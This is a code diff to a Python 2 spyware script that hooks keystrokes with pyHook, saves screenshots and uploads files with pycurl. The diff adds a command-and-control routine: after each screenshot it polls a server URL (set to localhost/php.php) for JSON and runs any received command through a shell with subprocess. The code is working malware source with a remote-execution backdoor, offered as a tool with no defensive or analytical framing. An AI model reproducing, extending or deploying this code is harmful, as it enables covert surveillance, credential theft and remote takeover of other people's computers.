@@ -1,10 +1,12 @@
-import random
+import random 
 import threading
 import pyHook
 import gtk.gdk
 import urllib2, urllib
 import pycurl
 import cStringIO
+import json
+import subprocess
 
 def OnKeyboardEvent(event):
     
@@ -35,6 +37,17 @@ def captureImage():
         name = random.getrandbits(32)
         name = str(name)+".png"
         pb.save(name,"png")
+    checkRemoteServer()
+        
+def checkRemoteServer():
+    req_url = makeFullUrl()
+    data = urllib2.urlopen(req_url).read()
+    data_json = json.loads(data)
+    if data_json['batch'] == "true":
+        result = executeBatchScript(data_json['command'])
+        print result
+      
+
 
 def getRandomString():
      seed = random.getrandbits(32)
@@ -44,6 +57,7 @@ def executeBatchScript(command):
         result = subprocess.check_output(command, shell=True)
     except subprocess.CalledProcessError as error:
         print("Error: Command exited with code {0}".format(error.returncode))
+    return result    
 def doPost(post_url):
     
     mydata=[('one','1'),('two','2')]    #The first is the var name the second is the value
@@ -63,7 +77,11 @@ def uploadFile(url,filename):
     c.setopt(c.VERBOSE, 1)
     c.setopt(c.WRITEFUNCTION, response.write)
     c.perform()
-    c.close()            
+    c.close()
+def makeFullUrl():
+    host = "http://localhost/"
+    return host+"php.php"    
+                    
                
     
 hm = pyHook.HookManager()
